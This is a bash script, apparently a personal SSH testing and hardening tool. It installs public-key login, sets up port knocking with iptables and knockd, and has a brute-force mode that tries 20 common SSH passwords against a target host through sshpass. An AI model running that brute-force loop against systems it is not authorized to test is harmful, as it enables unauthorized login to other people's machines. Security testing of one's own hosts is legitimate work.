#!/bin/bash
# -*- coding: utf-8 -*-
# basic ssh "pentest"
#
# usage: bash s.sh -h HOST [-u USER] [-p PORT] [ -k[g] / -b / -n ]

# from: https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt
passwords=(
root toor raspberry test uploader password admin administrator marketing
12345678 1234 12345 qwerty webadmin webmaster maintaince techsupport
letmein logon Passw@rd
)

while getopts h:u:p:kgbn opt #to make getopts expect an argument for an option,
do                         #place ':' after the proper option flag.
	case $opt in
		h)host=$OPTARG;;
		u)user=$OPTARG;;
		p)port=$OPTARG;;
		k)publickey=1;;  # config authentication with public key
		g)genNewKey=1;;  # generate a new keys pair
		b)bruteforce=1;; # bruteforce login with top20 common passwds
		n)portKnocking=1;; # protect ssh port through a pkgs sequence
	esac
done

if [[ -n $host ]] #if $host is non-empty
then

	if [[ -z $user ]] #if $user is empty,
	then
		user="root" #default user
	fi
	if [[ -z $port ]] #if $port is empty,
	then
		port="22" #default port
	fi

	echo -e " USER=$user\n HOST=$host\n PORT=$port\n"

	if [[ $bruteforce ]]
	then
		#TODO: check if sshpass is installed
		# echo 'sshpass must be installed for bruteforcing ssh login.'
		# echo -e '$ sudo apt install sshpass\n'
		# sudo apt-get install sshpass

		echo 'bruteforcing ssh login for user $user with top20 common passwds..'
		for passwd in ${passwords[*]}
		do
			echo -e "\n$ sshpass -p $passwd ssh -p $port $user@$host"
			sshpass -p $passwd ssh -p $port $user@$host
			#TODO: stop if it logs in
		done
	fi

	if [[ $publickey ]]
	then
		if [[ $genNewKey ]]
		then
			echo 'generating a public and private key pair..'
			echo -e '$ ssh-keygen -t rsa\n'
			ssh-keygen -t rsa
		fi

		echo 'configuring ssh authentication with public key for user $user..'
		echo -e '$ cat ~/.ssh/id_rsa.pub | ssh $user@$host -p $port "mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys"\n'
		cat ~/.ssh/id_rsa.pub | ssh $user@$host -p $port "mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys"
	fi

	if [[ $portKnocking ]]
	then
		#TODO: check if iptables is installed
		# echo 'iptables must be installed for portknocking.'
		# echo -e '$ sudo apt install iptables\n'
		# sudo apt-get install iptables

		echo 'configuring iptables..'
		sudo iptables -P INPUT ACCEPT
		sudo iptables -P FORWARD ACCEPT
		sudo iptables -P OUTPUT ACCEPT
		sudo iptables -A INPUT -i lo -j ACCEPT
		sudo iptables -A INPUT -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
		sudo iptables -A INPUT -p tcp -m tcp --dport 80 -j ACCEPT
		sudo iptables -A INPUT -j DROP

		#TODO: check if knockd is installed
		# echo 'knockd must be installed for portknocking.'
		# echo -e '$ sudo apt install knockd\n'
		# sudo apt-get install knockd

		echo 'configuring /etc/knockd.conf and /etc/default/knockd files..'
		echo "
[options]
    UseSyslog

[SSH]
    sequence = 7000,8000,9000
    tcpflags = syn
    seq_timeout = 15
    start_command = /sbin/iptables -I INPUT 1 -s %IP% -p tcp --dport $port -j ACCEPT
    cmd_timeout = 10
    stop_command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport $port -j ACCEPT
" | sudo tee -a /etc/knockd.conf > /dev/null
	echo "START_KNOCKD=1" | sudo tee -a /etc/default/knockd > /dev/null
	sudo service knockd restart
	echo 'now you must send packets to the sequence ports before ssh login'
	echo 'e.g.: nc $host 7000; nc $host 8000; nc $host 9000; ssh $user@$host -p $port'
	# clear all:
	# sudo iptables -F
	# sudo rm /etc/knockd.conf /etc/default/knockd
	fi

else
	echo "required: -h hostIP"
fi
